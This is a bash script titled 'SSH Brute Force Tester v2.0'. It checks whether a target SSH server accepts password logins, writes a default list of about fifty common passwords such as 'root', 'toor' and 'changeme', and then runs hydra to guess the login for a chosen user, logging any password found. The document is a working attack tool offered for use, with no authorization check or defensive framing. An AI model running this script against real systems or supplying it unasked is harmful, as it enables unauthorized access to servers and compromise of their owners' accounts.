#!/bin/bash
# SSH Brute Force Tester v2.0
# Usage: ./ssh-brute.sh <ip> <user> [wordlist] [port]
# ./ssh-brute.sh 192.168.1.1 root
# ./ssh-brute.sh 192.168.1.1 admin /path/to/wordlist.txt 2222

set -euo pipefail

IP="${1:?Usage: $0 <ip> <user> [wordlist] [port]}"
USER="${2:?Usage: $0 <ip> <user> [wordlist] [port]}"
WORDLIST="${3:-/tmp/sshpw.txt}"
PORT="${4:-22}"
LOG="/tmp/ssh-brute-$(date +%Y%m%d-%H%M%S).log"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log() { echo -e "$1" | tee -a "$LOG"; }

log "${YELLOW}=== SSH Brute Force Tester v2.0 ===${NC}"
log "Target: ${RED}$IP:$PORT${NC}"
log "User:   ${RED}$USER${NC}"
log "Log:    $LOG"
log ""

# Check if password auth is supported
log "${YELLOW}[1/3] Checking password auth on port $PORT...${NC}"
SSH_OUTPUT=$(ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes -o PreferredAuthentications=none -p "$PORT" "$USER@$IP" 2>&1) || true

if echo "$SSH_OUTPUT" | grep -q "publickey"; then
    log "${RED}[!] Target does NOT support password authentication${NC}"
    log "${RED}[!] Server only accepts SSH keys - brute force impossible${NC}"
    exit 1
elif echo "$SSH_OUTPUT" | grep -q "Connection refused"; then
    log "${RED}[!] Connection refused on port $PORT${NC}"
    exit 1
elif echo "$SSH_OUTPUT" | grep -q "Connection timed out"; then
    log "${RED}[!] Connection timed out on port $PORT${NC}"
    exit 1
elif echo "$SSH_OUTPUT" | grep -q "No route to host"; then
    log "${RED}[!] No route to host${NC}"
    exit 1
elif echo "$SSH_OUTPUT" | grep -q "Network is unreachable"; then
    log "${RED}[!] Network unreachable${NC}"
    exit 1
elif echo "$SSH_OUTPUT" | grep -q "Permission denied (password)"; then
    log "${GREEN}[+] Password auth supported! (server rejected empty password)${NC}"
else
    log "${YELLOW}[?] Unknown response, trying anyway...${NC}"
    log "${YELLOW}[?] SSH output: $SSH_OUTPUT${NC}"
fi

# Generate wordlist if not exists
if [ ! -f "$WORDLIST" ]; then
    log "${YELLOW}[2/3] Generating default wordlist ($WORDLIST)...${NC}"
    cat > "$WORDLIST" << 'EOF'
root
toor
admin
password
123456
12345678
qwerty
abc123
password1
letmein
welcome
monkey
master
dragon
login
princess
football
shadow
sunshine
trustno1
batman
access
hello
charlie
123456789
1234567890
000000
111111
1234
12345
123123
666666
1q2w3e4r
qwerty123
1qaz2wsx
admin123
root123
passw0rd
p@ssword
p@ssw0rd
changeme
default
test
guest
ubuntu
debian
centos
server
linux
vps
EOF
else
    log "${GREEN}[2/3] Using wordlist: $WORDLIST${NC}"
fi

COUNT=$(wc -l < "$WORDLIST" | tr -d ' ')
log "${YELLOW}[3/3] Starting brute force ($COUNT passwords, timeout 300s)...${NC}"
log ""

# Run hydra with timeout, capture exit code
HYDRA_EXIT=0
timeout 300 hydra -l "$USER" -P "$WORDLIST" -t 4 -f -V -s "$PORT" "$IP" ssh 2>&1 | tee -a "$LOG" | while IFS= read -r line; do
    if echo "$line" | grep -q "host:"; then
        log "${GREEN}[FOUND] $line${NC}"
    elif echo "$line" | grep -q "\[ATTEMPT\]"; then
        # Extract login info without Perl regex
        attempt=$(echo "$line" | sed -n 's/.*login: //p')
        printf "${YELLOW}[*] Trying: %s\r${NC}" "$attempt"
    fi
done || HYDRA_EXIT=$?

log ""
log ""

# Check results
if [ $HYDRA_EXIT -eq 124 ]; then
    log "${RED}[!] Timed out after 300 seconds${NC}"
elif [ $HYDRA_EXIT -eq 0 ]; then
    if grep -q "host:" "$LOG" 2>/dev/null; then
        log "${GREEN}[+] Password found! Check log: $LOG${NC}"
    else
        log "${YELLOW}[-] No password found in wordlist${NC}"
    fi
else
    log "${RED}[!] Hydra exited with code $HYDRA_EXIT${NC}"
fi

log "${YELLOW}=== Scan Complete ===${NC}"
log "Full log: $LOG"
